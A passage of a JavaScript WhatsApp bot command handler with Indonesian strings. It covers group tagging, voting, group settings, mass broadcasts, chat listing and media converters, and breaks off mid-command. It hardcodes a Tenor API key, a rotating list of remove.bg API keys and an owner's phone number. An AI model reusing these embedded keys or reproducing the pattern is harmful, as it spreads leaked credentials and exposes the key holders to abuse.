                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                await hisoka.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                
let teks = `══✪〘 👥 Tag All 〙✪══
•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• \nINFO: ${q ? q : 'kosong'}\n•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• \n`
                for (let mem of participants) {
                teks += `╭━═════════════━• \n│➳ @${mem.id.split('@')[0]}\n╰━═════════════━•\n•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
                }
                hisoka.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
                if (!isCreator) return
            if (!m.isGroup) throw mess.group
            hisoka.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `│➳ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            hisoka.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            hisoka.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: hisoka.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            hisoka.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${hisoka.user.id}
`
hisoka.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await hisoka.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await hisoka.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Group`, hisoka.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await hisoka.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await hisoka.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Edit Info`, hisoka.user.name, m)

            }
            }
            break

case 'autoread':
	if (!isCreator) return m.reply(`Khusus Owner`)
	if (args[0] == 'on') {
		if (autoread) return m.reply('*Sudah aktif!*')
		autoread = true
		m.reply('*Berhasil mengaktifkan auto read sw*')
	} else if (args[0] == 'off') {
		if (!autoread) return m.reply('*Belum aktif!*')
		autoread = false
		m.reply('*Berhasil mematikan auto read sw*')
	} else {
		m.reply('Pilih on atau off!')
	}
	break
case 'welcome': {
if (isBan) return m.reply(mess.ban)
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Succes menyalakan welcome di group ini 🌷')
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Mati')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Succes mematikan welcome di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Antilink`, hisoka.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${hisoka.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${hisoka.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mute Bot`, hisoka.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await hisoka.groupInviteCode(m.chat)
                hisoka.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await hisoka.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await hisoka.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                hisoka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await hisoka.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/Hisoka-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(i, txt, hisoka.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Source Code',
                                    url: 'https://github.com/DikaArdnt/Hisoka-Morou'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 882-9202-4190'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Script',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(yoi, txt, hisoka.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `│➳ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━│➳ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} │➳ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                hisoka.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await hisoka.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await hisoka.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    hisoka.sendText(m.chat, 'List Online:\n\n' + online.map(v => '│➳ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!isCreator) return
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
            case 'emojimix': {
            if (!isCreator) return
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
	    if (!isCreator) return
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	       case 'attp2': case 'ttp': {
	       if (!isCreator) return
           if (!text) throw `Example : ${prefix + command} text`
           await hisoka.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})

         }
         break
        case 'attp':
 try {
if (args.length == 0) return m.reply(`Example: ${prefix + command} YUxdev`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await hisoka.sendMessage(m.chat, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
 console.log(e)
 m.reply(`Maap sedang error coba lagi besok`)            
}
break
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	       if (!isCreator) return
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await hisoka.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
	        case 'simih': case 'simisimi': {
            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    hisoka.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
	        if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!isCreator) return
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${hisoka.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	        if (!isCreator) return
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await hisoka.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    hisoka.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `│➳ No : ${no++}\n│➳ Type : ${i.type}\n│➳ Video ID : ${i.videoId}\n│➳ Title : ${i.title}\n│➳ Views : ${i.views}\n│➳ Duration : ${i.timestamp}\n│➳ Upload At : ${i.ago}\n│➳ Author : ${i.author.name}\n│➳ Url : ${i.url}\n\n─────────────────\n\n`
                }
                hisoka.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `│➳ *Title* : ${g.title}\n`
                teks += `│➳ *Description* : ${g.snippet}\n`
                teks += `│➳ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
╭━═════════════━•
│➳ Title : ${anu.title}
│➳ Ext : Search
│➳ ID : ${anu.videoId}
│➳ Duration : ${anu.timestamp}
│➳ Viewers : ${anu.views}
│➳ Upload At : ${anu.ago}
│➳ Author : ${anu.author.name}
│➳ Channel : ${anu.author.url}
│➳ Description : ${anu.description}
│➳ Url : ${anu.url}
╰━═════════════━•`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
	    if (!isCreator) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
